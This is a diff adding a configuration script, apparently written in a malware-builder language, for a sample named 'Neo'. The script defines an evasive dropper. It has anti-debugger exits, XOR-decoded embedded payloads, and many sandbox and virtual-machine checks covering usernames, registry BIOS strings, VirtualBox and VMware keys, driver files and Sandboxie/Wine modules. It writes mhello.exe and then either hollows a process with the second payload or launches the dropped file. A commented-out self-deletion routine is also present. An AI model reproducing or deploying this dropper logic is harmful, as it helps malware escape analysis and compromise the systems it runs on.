@@ -1,0 +1,40 @@
+#SAMPLE
+
+name[Neo]
+version[alpha]
+
+#PIECES
+
+if.debugger[(direct[exit\(0\)][]),(direct[sleep\(10\)][])][]
+
+datamanip.xORarray[PACK1,42][unxored1, unxorsize1]
+datamanip.xORarray[PACK2,42][unxored2, unxorsize2]
+
+datamanip.initint[virtflag,0][]
+
+if.hookedfx[CreateProcess,(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.mousemov[4242,10,(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+
+if.mousemov[13,200,(direct[sleep\(1\)][]),(datamanip.incrint[virtflag,1][])][]
+
+if.username[{"sample","qemu","vbox","sandbox","malware","virtual","simulation"},(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.computername[{"sample","qemu","vbox","sandbox","malware","virtual","simulation"},(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.filepath[{"sample","qemu","vbox","sandbox","malware","virtual","simulation"},(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.module["sbiedll.dll",(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.modulefunction["kernel32.dll","wine_get_unix_file_name",(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.regstr["HARDWARE\\Description\\System","SystemBiosVersion",{"vbox","vmware","qemu"},(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.regstr["HARDWARE\\Description\\System","VideoBiosVersion",{"virtualbox", "vbox", "vmware","qemu"},(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.regkey[HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions",(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.regkey[HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools",(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.filexist["C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys",(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.filexist["C:\\WINDOWS\\system32\\drivers\\vmmouse.sys",(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+if.filexist["C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",(datamanip.incrint[virtflag,1][]),(direct[sleep\(1\)][])][]
+
+datamanip.int2str[virtflag][svirtflag]
+cli.print[svirtflag][]
+
+file.writeptr["mhello.exe",unxored1,unxorsize1][]
+
+if.deltaval[virtflag,0,4,(process.nebbettshuttle[unxored2,"mhello.exe"][]),(process.create["mhello.exe",NULL,CREATE_NEW_CONSOLE][mphandle])][]
+
+##routine.melting[][]
